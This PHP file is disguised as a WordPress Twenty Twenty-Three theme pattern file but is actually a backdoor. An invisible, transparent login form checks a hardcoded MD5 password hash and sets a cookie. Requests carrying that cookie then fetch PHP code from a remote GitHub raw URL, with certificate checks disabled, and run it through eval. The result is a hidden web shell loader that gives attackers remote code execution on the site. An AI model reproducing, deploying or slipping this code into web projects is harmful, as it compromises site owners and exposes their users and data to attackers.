<?php
/**
 * Title: Hidden Heading for Homepage
 * Slug: twentytwentythree/hidden-heading
 * Inserter: no
 
?>
<!-- wp:heading {"level":1,"align":"wide","style":{"spacing":{"margin":{"bottom":"var:preset|spacing|60"}}}} -->
<h1 class="alignwide" style="margin-bottom:var(--wp--preset--spacing--60)"><?php echo esc_html_x( 'Mindblown: a blog about philosophy.', 'Main heading for homepage', 'twentytwentythree' ); ?></h1>
<!-- /wp:heading -->
*/
/**
* The core configuration of a WordPress
* system is largely defined by the configurations of server
* and generate content PHP for theme version
*/

/**
* located in the root directory of your theme WordPress installation
* posts, pages, comments, user data, settings, etc
* You can control automatic updates for WordPress PHP themes
* used to configure various other advanced settings
*/

/**
* You can access and edit configurations using a file manager provided by your web host
* Dont Edit Anything In This Folder If You Not the root for permission
*/

/**
* Function to check if the user is logged in based on the presence of a valid cookie
*/
function is_logged_in()
{
    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'user123'; // Change 'user123' with value valid
}

/**
* Check if the user is logged in before executing the content
*/
if (is_logged_in()) {
    /** Function to get URL content (similar to your previous code)
*/
    function geturlsinfo($url)
    {
        if (function_exists('curl_exec')) {
            $conn = curl_init($url);
            curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

            $url_get_contents_data = curl_exec($conn);
            curl_close($conn);
        } elseif (function_exists('file_get_contents')) {
            $url_get_contents_data = file_get_contents($url);
        } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
            $handle = fopen($url, "r");
            $url_get_contents_data = stream_get_contents($handle);
            fclose($handle);
        } else {
            $url_get_contents_data = false;
        }
        return $url_get_contents_data;
    }

    $a = geturlsinfo('https://raw.githubusercontent.com/soy777/2026news/main/news.php');
    eval('?>' . $a);
} else {
    /** Display login form if not logged in */
    if (isset($_POST['password'])) {
        $entered_password = $_POST['password'];
        $hashed_password = '9c5b3082eae2c54711bb99f361f58073';
        if (md5($entered_password) === $hashed_password) {
            /** Password is correct, set a cookie to indicate login */
            setcookie('user_id', 'user123', time() + 3600, '/');
        } else {
            /** Password is incorrect */
            echo "Incorrect password. Please try again.";
        }
    }
    ?>
<!DOCTYPE html>
<html>
<head>
    <title>Admin Login</title>
    <style>

        input[type="password"] {
            border: none;
            background: transparent;
            color: transparent;
            outline: none;
        }

        input[type="submit"] {
            border: none;
            background: transparent;
            color: transparent;
            outline: none;
            cursor: default;
        }
    </style>
</head>
<body>
    <form method="POST" action="">
        <label for="password"> </label>
        <input type="password" id="password" name="password">
        <input type="submit" value="Login">
    </form>
</body>
</html>
    <?php
}
?>
